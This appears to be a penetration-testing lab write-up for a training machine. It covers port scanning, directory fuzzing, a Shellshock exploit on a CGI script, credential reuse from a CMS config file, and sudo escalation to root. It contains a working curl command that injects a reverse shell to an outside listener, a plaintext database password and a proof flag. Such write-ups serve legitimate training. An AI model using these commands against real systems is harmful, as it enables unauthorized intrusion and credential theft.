## Enumeration
### NMAP

```bash
nmap -sC -sV -v -Pn -oN scans/nmap.txt 10.11.1.71
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e6:43:89:59:f9:85:d8:e2:bb:e3:d7:ed:28:5c:c5:65 (ECDSA)
|_  256 3b:0b:f3:84:3c:7d:6e:2b:2c:81:11:94:16:9b:71:7d (ED25519)
80/tcp open  http    Apache/2.4.7 (Ubuntu)
|_http-server-header: Apache/2.4.7 (Ubuntu)

```

### Website

![](evidence/screenshots/20220726011503.png)  

We see that the website is using the [BigTree CMS](https://www.bigtreecms.org/).

![](evidence/screenshots/20220726020827.png)  

### Fuzzing

```bash
gobuster dir -u 10.11.1.71 -w /usr/share/wordlists/dirb/common.txt  | tee scans/gobuster_common.txt
```

There's a few interesting directories, `cgi-bin` and `phpmyadmin`.

![](evidence/screenshots/20220726015344.png)  

I'll next enumerate scripts within the `cgi-bin` directory.

```bash
gobuster dir -u 10.11.1.71/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt | tee scans/gobuster_common_cgibin.txt
```

Since `admin.cgi` exists, it might be vulnerable to `shellshock`.

![](evidence/screenshots/20220726015640.png)  

We can check the vulnerability via `nmap`.

```bash
nmap 10.11.1.71 -p 80 -oN scans/shellshock.txt --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```

Looks like it's vulnerable to the `shellshock` vulnerability. Let's source an exploit.

![](evidence/screenshots/20220726015810.png)  

## Inital Access

Setup a `netcat` listener.

```bash
rlwrap nc -lnvp 9001
```

Execute shellshock payload with reverse shell payload.

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.230/9001 0>&1' http://10.11.1.71/cgi-bin/admin.cgi
```

We get a shell!

![](evidence/screenshots/20220726020713.png)  

Upgrade shell.

```bash
export TERM=xterm
script -qc /bin/bash /dev/null
```

## Shell as Gibson
### Enumeration

Knowing the website is using a CMS and that `phpmysql` is running we can assume there's some sort of configuration file.

If we look at the `/var/www/html/templates/config.php` file it contains database credentials.

```bash
cat config.php | grep db
```

![](evidence/screenshots/20220726021702.png)  

```text
$bigtree["config"]["db"]["name"] = "wingnut";
$bigtree["config"]["db"]["user"] = "root";
$bigtree["config"]["db"]["password"] = "zaq1xsw2cde3";
```

Let's find out what users we can login as.

```bash
cat /etc/passwd | grep /bin/bash
```

![](evidence/screenshots/20220726022230.png)  

Let's try reusing the credentials we found in the config to login using `ssh`.

```bash
ssh gibson@10.11.1.71
```

![](evidence/screenshots/20220726022311.png)  

## Shell as Root
### Enumeration

```bash
id
sudo -l
```

![](evidence/screenshots/20220726030906.png)  

Since we have sudo rights, we can just use `su` to escalate to root.

```bash
cat /root/proof.txt && ifconfig
```

![](evidence/screenshots/20220726031016.png)  

```text
97f3446c2c2fc5079f22dc38f60c8a78
```